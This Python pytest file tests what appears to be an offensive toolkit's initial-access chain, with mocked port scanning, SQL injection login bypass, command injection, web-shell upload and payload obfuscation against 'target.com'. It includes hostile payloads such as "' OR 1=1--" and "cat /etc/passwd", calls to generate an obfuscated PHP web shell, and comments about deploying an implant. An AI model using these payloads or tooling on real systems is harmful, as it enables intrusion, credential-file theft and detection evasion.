"""
Integration tests for Initial Access chain.

Tests the full workflow from reconnaissance to exploitation.
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
from recon.network_scanner import NetworkScanner, PortScanResult
from recon.web_scanner import WebScanner, Vulnerability
from initial_access.sqli_exploit import SQLiExploit
from initial_access.cmd_injection import CmdInjectionExploit
from initial_access.file_upload import FileUploadExploit
from utils.obfuscation import PayloadObfuscator


class TestReconToExploitChain:
    """Test the chain from reconnaissance to exploitation."""

    @patch('requests.Session.get')
    @patch('socket.socket')
    def test_port_scan_to_web_scan(self, mock_socket_class, mock_get):
        """Test discovering web service and scanning for vulnerabilities."""
        # Step 1: Port scan discovers HTTP service
        network_scanner = NetworkScanner()

        mock_socket = Mock()
        mock_socket.connect_ex.return_value = 0
        mock_socket.recv.return_value = b'HTTP/1.1'
        mock_socket_class.return_value = mock_socket

        port_results = network_scanner.scan_ports('target.com', [80, 443], grab_banner=False)

        # Verify we found open ports
        open_ports = [r for r in port_results if r.state == 'open']
        assert len(open_ports) > 0

        # Step 2: Web scan the discovered HTTP service
        web_scanner = WebScanner()

        mock_response = Mock()
        mock_response.text = "MySQL syntax error"
        mock_get.return_value = mock_response

        vulns = web_scanner.test_sqli('http://target.com', {'id': '1'})

        # Verify we found vulnerabilities
        assert len(vulns) > 0
        assert vulns[0].vuln_type == 'SQL Injection'

    @patch('requests.Session.get')
    def test_web_scan_to_exploitation(self, mock_get):
        """Test finding vulnerability and then exploiting it."""
        # Step 1: Web scanner finds SQL injection
        web_scanner = WebScanner()

        mock_response = Mock()
        mock_response.text = "SQL syntax error MySQL"
        mock_get.return_value = mock_response

        vulns = web_scanner.test_sqli('http://target.com/page', {'id': '1'})

        assert len(vulns) > 0

        # Step 2: Exploit the discovered SQL injection
        sqli_exploit = SQLiExploit('http://target.com')

        # Reset mock for exploitation
        mock_response.text = "Normal page"
        mock_get.reset_mock()

        # This would normally exploit the vulnerability
        # For testing, we just verify the exploit can be instantiated
        assert sqli_exploit.target_url == 'http://target.com'

    @patch('requests.Session.post')
    def test_full_initial_access_chain(self, mock_post):
        """Test complete initial access chain."""
        # Step 1: Discover vulnerability (already done in recon)

        # Step 2: Exploit SQL injection for authentication bypass
        sqli_exploit = SQLiExploit('http://target.com')

        mock_response = Mock()
        mock_response.status_code = 302
        mock_response.text = "dashboard"
        mock_response.headers = {'Set-Cookie': 'session=abc'}
        mock_post.return_value = mock_response

        auth_result = sqli_exploit.auth_bypass('/login')

        assert auth_result is not None

        # Step 3: Would deploy implant (tested separately)
        # Verified that auth bypass was successful
        assert auth_result.status_code == 302


class TestObfuscationIntegration:
    """Test obfuscation integration with exploits."""

    def test_obfuscated_sql_payload(self):
        """Test using obfuscated SQL payload."""
        payload = "' OR 1=1--"
        obfuscated = PayloadObfuscator.obfuscate_sql_payload(payload)

        # Verify obfuscation occurred
        assert obfuscated != payload
        assert 'OR' in obfuscated.upper()

    def test_obfuscated_command_payload(self):
        """Test using obfuscated command injection payload."""
        command = "cat /etc/passwd"
        obfuscated = PayloadObfuscator.obfuscate_bash(command, level=1)

        # Verify obfuscation occurred
        assert 'base64' in obfuscated
        assert 'bash' in obfuscated

    def test_obfuscated_php_webshell(self):
        """Test generating obfuscated PHP web shell."""
        shell = PayloadObfuscator.create_obfuscated_php_shell('cmd')

        # Verify shell is PHP and contains obfuscation
        assert '<?php' in shell
        assert 'cmd' in shell
        assert 'str_rot13' in shell or 'base64' in shell.lower()


class TestMultipleExploitPaths:
    """Test multiple exploitation paths."""

    @patch('requests.Session.post')
    def test_sqli_vs_cmdi_choice(self, mock_post):
        """Test choosing between SQL injection and command injection."""
        # Both vulnerabilities present - test SQL injection path
        sqli_exploit = SQLiExploit('http://target.com')

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.text = "dashboard"
        mock_post.return_value = mock_response

        sqli_result = sqli_exploit.auth_bypass('/login')

        # Test command injection path
        cmdi_exploit = CmdInjectionExploit('http://target.com')

        mock_response.text = "uid=33(www-data)"
        mock_post.reset_mock()

        # Verify both exploit classes can be instantiated
        assert sqli_exploit is not None
        assert cmdi_exploit is not None

    def test_multiple_upload_techniques(self):
        """Test multiple file upload techniques."""
        upload_exploit = FileUploadExploit('http://target.com')

        # Test different shell types
        for shell_type in ['php', 'aspx', 'jsp']:
            assert shell_type in upload_exploit.BYPASS_EXTENSIONS

        # Verify web shells are defined for each type
        assert 'php' in upload_exploit.WEB_SHELLS
        assert 'aspx' in upload_exploit.WEB_SHELLS


class TestExploitChainResilience:
    """Test exploit chain handles failures gracefully."""

    @patch('requests.Session.get')
    def test_failed_recon_graceful(self, mock_get):
        """Test that failed reconnaissance is handled gracefully."""
        web_scanner = WebScanner()

        mock_get.side_effect = Exception("Network error")

        # Should not raise exception
        vulns = web_scanner.test_sqli('http://target.com', {'id': '1'})

        assert vulns == []

    @patch('requests.Session.post')
    def test_failed_exploit_graceful(self, mock_post):
        """Test that failed exploitation is handled gracefully."""
        sqli_exploit = SQLiExploit('http://target.com')

        mock_post.side_effect = Exception("Connection refused")

        # Should not raise exception
        result = sqli_exploit.auth_bypass('/login')

        assert result is None

    @patch('socket.socket')
    def test_failed_port_scan_graceful(self, mock_socket_class):
        """Test that failed port scan is handled gracefully."""
        scanner = NetworkScanner()

        mock_socket = Mock()
        mock_socket.connect_ex.side_effect = Exception("Network unreachable")
        mock_socket_class.return_value = mock_socket

        # Should not raise exception
        result = scanner.scan_port('invalid.target', 80)

        assert result.state == 'filtered'


class TestEndToEndScenario:
    """Test realistic end-to-end scenarios."""

    @patch('requests.Session.get')
    @patch('requests.Session.post')
    @patch('socket.socket')
    def test_complete_attack_scenario(self, mock_socket_class, mock_post, mock_get):
        """Test complete attack scenario from scan to implant."""
        # Scenario: Discover web server, find SQLi, exploit, deploy implant

        # Step 1: Network scan discovers web server
        network_scanner = NetworkScanner()

        mock_socket = Mock()
        mock_socket.connect_ex.return_value = 0
        mock_socket_class.return_value = mock_socket

        ports = network_scanner.scan_ports('target.com', [80], grab_banner=False)
        assert any(p.state == 'open' for p in ports)

        # Step 2: Web scan finds SQL injection
        web_scanner = WebScanner()

        mock_get_response = Mock()
        mock_get_response.text = "MySQL error in query"
        mock_get.return_value = mock_get_response

        vulns = web_scanner.test_sqli('http://target.com/page', {'id': '1'})
        assert len(vulns) > 0

        # Step 3: Exploit SQL injection for auth bypass
        sqli_exploit = SQLiExploit('http://target.com')

        mock_post_response = Mock()
        mock_post_response.status_code = 302
        mock_post_response.text = "welcome"
        mock_post.return_value = mock_post_response

        auth_result = sqli_exploit.auth_bypass('/login')
        assert auth_result is not None

        # Step 4: Would deploy implant (mocked file operations would be needed)
        # Verification: All steps completed successfully
        assert len(vulns) > 0
        assert auth_result.status_code == 302

    @patch('requests.Session.post')
    def test_fallback_exploit_methods(self, mock_post):
        """Test falling back to alternative exploit methods."""
        # Try SQL injection first
        sqli_exploit = SQLiExploit('http://target.com')

        # Simulate SQLi failure
        mock_response = Mock()
        mock_response.status_code = 401
        mock_response.text = "Login failed"
        mock_post.return_value = mock_response

        sqli_result = sqli_exploit.auth_bypass('/login')
        assert sqli_result is None

        # Fallback to command injection
        cmdi_exploit = CmdInjectionExploit('http://target.com')

        # Simulate command injection success
        mock_response.text = "uid=0(root)"
        cmdi_result = 'uid=0(root)'  # Simulated success

        # Verify we can try alternative methods
        assert sqli_result is None
        assert 'uid=' in cmdi_result


class TestToolCoordination:
    """Test coordination between different tools."""

    def test_scanner_exploit_data_flow(self):
        """Test data flows correctly from scanner to exploit."""
        # Scanner identifies vulnerability details
        vuln = Vulnerability(
            vuln_type='SQL Injection',
            severity='critical',
            url='http://target.com/login',
            parameter='username',
            payload="' OR 1=1--"
        )

        # Exploit uses vulnerability details
        exploit = SQLiExploit('http://target.com')

        # Verify exploit can target the discovered endpoint
        assert vuln.url.startswith(exploit.target_url)
        assert vuln.parameter == 'username'

    def test_obfuscation_with_all_exploits(self):
        """Test obfuscation works with all exploit types."""
        # SQL injection
        sql_payload = "' OR 1=1--"
        sql_obfuscated = PayloadObfuscator.obfuscate_sql_payload(sql_payload)
        assert sql_obfuscated != sql_payload

        # Command injection
        cmd_payload = "cat /etc/passwd"
        cmd_obfuscated = PayloadObfuscator.obfuscate_bash(cmd_payload, level=1)
        assert 'base64' in cmd_obfuscated

        # PowerShell
        ps_payload = "Get-Process"
        ps_obfuscated = PayloadObfuscator.obfuscate_powershell(ps_payload, level=1)
        assert 'powershell' in ps_obfuscated.lower()


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
